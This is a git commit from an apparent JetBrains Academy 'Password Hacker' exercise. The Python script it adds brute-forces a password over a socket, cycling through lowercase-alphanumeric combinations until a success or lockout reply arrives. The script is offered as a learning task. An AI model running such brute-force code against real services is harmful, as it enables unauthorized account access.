f78a579087b39d26cd51996ac2af20f2be476166
merlin2181 <merlin2181@gmail.com>
2020-09-17 13:57:06 -0700

    Stage 2 of 5 for Password Hacker project from JetBrains Academy
    - Updated program to use brute force to hack the system
    - Now, the program takes 2 CLI positional arguments(hostname, port #).

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,17 +1,34 @@
 import argparse
+import itertools
 import socket
 
 pass_hacker = argparse.ArgumentParser(description='An automated password hacker')
 pass_hacker.add_argument("hostname", type=str, help='the IP address or domain name of the site you are trying to hack')
 pass_hacker.add_argument("port", type=int, help='the port number of the site you are trying to hack')
-pass_hacker.add_argument("message", type=str, help='the data you want to send to the site')
 args = pass_hacker.parse_args()
 
 hacker = socket.socket()
 address = (args.hostname, args.port)
+
+# Create a list with a-z and 0-9
+char_list = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(48, 58)]
+flag = True
+i = 1
 with hacker as h:
-    data = args.message.encode()
     h.connect(address)
-    h.send(data)
-    rec_data = h.recv(1024)
-    print(rec_data.decode())
+    while flag:
+        combinations = itertools.product(char_list, repeat=i)
+        for item in combinations:
+            data = ''.join(item)  # change tuple to string
+            data = data.encode()  # encode data string
+            h.send(data)  # send data string
+            rec_data = h.recv(1024)
+            if rec_data == b'Connection success!':
+                print(data.decode())
+                flag = False
+                break
+            elif rec_data == b'Too many attempts':
+                print('Too many attempts')
+                flag = False
+                break
+        i += 1
